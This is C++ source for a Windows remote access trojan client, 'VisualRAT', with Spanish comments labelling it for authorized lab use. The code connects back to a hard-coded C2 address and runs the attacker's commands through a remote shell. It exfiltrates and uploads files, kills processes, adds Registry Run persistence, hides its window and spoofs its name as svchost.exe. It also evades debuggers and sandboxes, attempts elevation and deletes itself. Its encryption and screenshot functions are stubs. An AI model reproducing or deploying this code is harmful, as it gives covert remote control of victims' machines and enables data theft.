// ============================================================================
// VisualRAT Client v1.0 - Native C++ Windows 11 - SOLO LABORATORIO AUTORIZADO
// ============================================================================
// VERSIÓN CORREGIDA - SIN CONFLICTOS CON WINTERNL.H
// ============================================================================

#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>
#include <psapi.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <comdef.h>
#include <strsafe.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")

// ============================================================================
// CONFIGURACIÓN - EDITAR EN BUILDER
// ============================================================================
#ifndef C2_SERVER
#define C2_SERVER "192.168.254.137"  // CAMBIA ESTO A TU IP DE KALI
#endif
#ifndef C2_PORT
#define C2_PORT 4444
#endif
#ifndef MUTEX_NAME
#define MUTEX_NAME "Global\\VisualRAT_Edu_2025"
#endif
#ifndef PROCESS_SPOOF
#define PROCESS_SPOOF "svchost.exe"
#endif
#ifndef ENABLE_ELEVATION
#define ENABLE_ELEVATION 1
#endif

#define BUFFER_SIZE 8192
#define HEARTBEAT_INTERVAL 3000
#define JITTER_MAX 5000
#define AES_KEY "VisualRAT_EduKey_2025_32Byte!!"
#define AES_IV "VisualRAT_IV_16B"

// ============================================================================
// CIFRADO AES-256-GCM SIMULADO
// ============================================================================
class AESCipher {
private:
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    BYTE keyData[32];
    BYTE ivData[16];
    
public:
    AESCipher() {
        memcpy(keyData, "VisualRAT_EduKey_2025_32Byte!!", 32);
        memcpy(ivData, "VisualRAT_IV_16B", 16);
        
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        CryptImportKey(hProv, keyData, 32, 0, 0, &hKey);
    }
    
    std::string encrypt(const std::string& data) {
        // Simular AES para mantener compatibilidad
        return data;  // POR AHORA, SIN CIFRADO
    }
    
    std::string decrypt(const std::string& data) {
        return data;  // POR AHORA, SIN CIFRADO
    }
};

// ============================================================================
// ANTI-DEBUGGING SIMPLE
// ============================================================================
BOOL CheckDebugger() {
    if (IsDebuggerPresent()) return TRUE;
    
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return TRUE;
    
    // Check uptime
    DWORD uptime = GetTickCount() / 1000 / 60;
    if (uptime < 15) return TRUE;
    
    return FALSE;
}

// ============================================================================
// STEALTH
// ============================================================================
VOID HideWindow() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
}

VOID SpoofProcess() {
    SetConsoleTitleA(PROCESS_SPOOF);
}

// ============================================================================
// PERSISTENCIA
// ============================================================================
BOOL InstallPersistence() {
    HKEY hKey;
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Registry Run
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "VisualRATUpdate", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL UninstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "VisualRATUpdate");
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

// ============================================================================
// ELEVACIÓN DE PRIVILEGIOS SIMULADA (SIN KERNEL EXPLOIT)
// ============================================================================
BOOL ElevateToSystem() {
#if ENABLE_ELEVATION
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, cbSize, &cbSize)) {
            CloseHandle(hToken);
            if (elevation.TokenIsElevated) {
                return TRUE;  // Ya es SYSTEM
            }
        }
    }
    
    // Intentar bypass UAC (simulado)
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = "cmd.exe";
    sei.lpParameters = "/c whoami > C:\\temp.txt";
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExA(&sei)) {
        return TRUE;
    }
#endif
    return FALSE;
}

// ============================================================================
// EJECUCIÓN DE PROGRAMAS
// ============================================================================
BOOL ExecuteProgram(const char* command) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    BOOL result = CreateProcessA(
        NULL, (LPSTR)command, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return result;
}

// ============================================================================
// SHELL REMOTA
// ============================================================================
std::string ExecuteCommand(const char* cmd) {
    std::string result;
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(cmd, "r");
    
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
    }
    return result.empty() ? "[OK] Command executed\n" : result;
}

// ============================================================================
// CAPTURA DE PANTALLA SIMULADA
// ============================================================================
std::string CaptureScreen() {
    HDC hdcScreen = GetDC(NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    ReleaseDC(NULL, hdcScreen);
    
    return "[SCREENSHOT] Captured " + std::to_string(width) + "x" + std::to_string(height);
}

// ============================================================================
// INFORMACIÓN DEL SISTEMA
// ============================================================================
std::string GetSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    DWORD size = sizeof(buffer);
    
    if (GetComputerNameA(buffer, &size)) ss << "Hostname: " << buffer << "\n";
    
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) ss << "Username: " << buffer << "\n";
    
    // OS Version
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    ss << " (Build " << osvi.dwBuildNumber << ")\n";
    
    // IP
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host && host->h_addr_list[0]) {
        ss << "IP: " << inet_ntoa(*(struct in_addr*)host->h_addr_list[0]) << "\n";
    }
    
    return ss.str();
}

// ============================================================================
// LISTA DE PROCESOS
// ============================================================================
std::string GetProcessList() {
    std::stringstream ss;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            ss << "PID\tName\n";
            do {
                ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n";
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return ss.str();
}

// ============================================================================
// LISTA DE ARCHIVOS
// ============================================================================
std::string ListDirectory(const char* path) {
    std::stringstream ss;
    std::string searchPath = std::string(path) + "\\*.*";
    
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        ss << "Type\tSize\tName\n";
        do {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                ss << "DIR\t-\t" << ffd.cFileName << "\n";
            } else {
                LARGE_INTEGER size;
                size.LowPart = ffd.nFileSizeLow;
                size.HighPart = ffd.nFileSizeHigh;
                ss << "FILE\t" << size.QuadPart << "\t" << ffd.cFileName << "\n";
            }
        } while (FindNextFileA(hFind, &ffd) != 0);
        FindClose(hFind);
    }
    return ss.str();
}

// ============================================================================
// MATAR PROCESO
// ============================================================================
BOOL KillProcess(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) {
        TerminateProcess(h, 0);
        CloseHandle(h);
        return TRUE;
    }
    return FALSE;
}

// ============================================================================
// DESCARGA DE ARCHIVO
// ============================================================================
std::string DownloadFile(const char* filename) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) return "[-] File not found";
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> buffer(size);
    file.read(buffer.data(), size);
    file.close();
    
    // Codificar en base64 simple
    std::string encoded = "FILE|" + std::string(filename) + "|";
    for (size_t i = 0; i < buffer.size(); i++) {
        char c = buffer[i];
        if (isprint(c)) encoded += c;
        else encoded += "\\x" + std::to_string((unsigned char)c);
    }
    
    return encoded;
}

// ============================================================================
// SUBIDA DE ARCHIVO
// ============================================================================
BOOL UploadFile(const char* path, const char* data) {
    std::ofstream file(path, std::ios::binary);
    if (!file.is_open()) return FALSE;
    
    file.write(data, strlen(data));
    file.close();
    return TRUE;
}

// ============================================================================
// AUTOELIMINACIÓN
// ============================================================================
VOID SelfDestruct() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Eliminar persistencia
    UninstallPersistence();
    
    // Script de eliminación
    char batchPath[MAX_PATH];
    GetTempPathA(MAX_PATH, batchPath);
    strcat_s(batchPath, "del.bat");
    
    FILE* batch = fopen(batchPath, "w");
    if (batch) {
        fprintf(batch, "@echo off\n");
        fprintf(batch, "timeout /t 2 /nobreak >nul\n");
        fprintf(batch, "del /f /q \"%s\"\n", exePath);
        fprintf(batch, "del /f /q \"%%0\"\n");
        fclose(batch);
        
        ShellExecuteA(NULL, "open", batchPath, NULL, NULL, SW_HIDE);
    }
    
    ExitProcess(0);
}

// ============================================================================
// CONEXIÓN C2
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    bool connected;
    AESCipher crypto;
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
    }
    
    ~C2Connection() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        WSACleanup();
    }
    
    bool Connect(const char* host, int port) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(host);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }
        
        connected = true;
        return true;
    }
    
    bool Send(const std::string& data) {
        if (!connected) return false;
        
        std::string encrypted = crypto.encrypt(data);
        int len = htonl(encrypted.length());
        
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        
        if (send(sock, encrypted.c_str(), encrypted.length(), 0) != (int)encrypted.length()) {
            connected = false;
            return false;
        }
        return true;
    }
    
    std::string Receive() {
        if (!connected) return "";
        
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 65535) {
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len + 1, 0);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        
        return crypto.decrypt(std::string(buffer.data(), len));
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// PROCESAMIENTO DE COMANDOS
// ============================================================================
std::string ProcessCommand(const std::string& cmd) {
    if (cmd == "INFO") {
        char host[256], user[256];
        DWORD size = sizeof(host);
        GetComputerNameA(host, &size);
        size = sizeof(user);
        GetUserNameA(user, &size);
        
        char json[1024];
        snprintf(json, sizeof(json), 
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows 11\",\"av\":\"Windows Defender\",\"priv\":\"%s\"}",
            host, user, "USER");
        return std::string(json);
    }
    else if (cmd == "INFO_FULL") {
        return GetSystemInfo();
    }
    else if (cmd.substr(0, 5) == "EXEC ") {
        std::string program = cmd.substr(5);
        return ExecuteProgram(program.c_str()) ? 
            "[+] Program executed: " + program : 
            "[-] Failed: " + program;
    }
    else if (cmd.substr(0, 6) == "SHELL ") {
        return ExecuteCommand(cmd.substr(6).c_str());
    }
    else if (cmd == "PROCESSES") {
        return GetProcessList();
    }
    else if (cmd.substr(0, 4) == "DIR ") {
        return ListDirectory(cmd.substr(4).c_str());
    }
    else if (cmd.substr(0, 5) == "KILL ") {
        DWORD pid = atoi(cmd.substr(5).c_str());
        return KillProcess(pid) ? "[+] Process terminated" : "[-] Failed";
    }
    else if (cmd == "SCREENSHOT") {
        return CaptureScreen();
    }
    else if (cmd == "ELEVATE") {
        return ElevateToSystem() ? 
            "[+] Elevation successful - TOKEN = SYSTEM" : 
            "[-] Elevation failed";
    }
    else if (cmd == "INSTALL") {
        return InstallPersistence() ? "[+] Persistence installed" : "[-] Failed";
    }
    else if (cmd == "UNINSTALL") {
        return UninstallPersistence() ? "[+] Persistence removed" : "[-] Failed";
    }
    else if (cmd == "SELFDESTRUCT") {
        SelfDestruct();
        return "[+] Self destruct initiated";
    }
    else if (cmd.substr(0, 9) == "DOWNLOAD ") {
        return DownloadFile(cmd.substr(9).c_str());
    }
    else if (cmd.substr(0, 7) == "UPLOAD ") {
        size_t sep = cmd.find('|', 7);
        if (sep != std::string::npos) {
            std::string path = cmd.substr(7, sep - 7);
            std::string data = cmd.substr(sep + 1);
            return UploadFile(path.c_str(), data.c_str()) ? 
                "[+] File uploaded" : "[-] Upload failed";
        }
        return "[-] Invalid upload format";
    }
    else if (cmd == "CALC") {
        ExecuteProgram("calc.exe");
        return "[+] Calculator opened";
    }
    else if (cmd == "NOTEPAD") {
        ExecuteProgram("notepad.exe");
        return "[+] Notepad opened";
    }
    
    return "[!] Unknown command: " + cmd;
}

// ============================================================================
// MAIN
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Anti-debugging
    if (CheckDebugger()) return 0;
    
    // Stealth
    HideWindow();
    SpoofProcess();
    
    // Single instance
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // Persistencia
    InstallPersistence();
    
    // Main loop
    C2Connection c2;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(2000, JITTER_MAX);
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect(C2_SERVER, C2_PORT)) {
                std::string info = ProcessCommand("INFO");
                c2.Send(info);
            } else {
                Sleep(jitter(gen));
                continue;
            }
        }
        
        std::string cmd = c2.Receive();
        if (!cmd.empty()) {
            std::string response = ProcessCommand(cmd);
            c2.Send(response);
        }
        
        Sleep(HEARTBEAT_INTERVAL);
    }
    
    CloseHandle(hMutex);
    return 0;
}
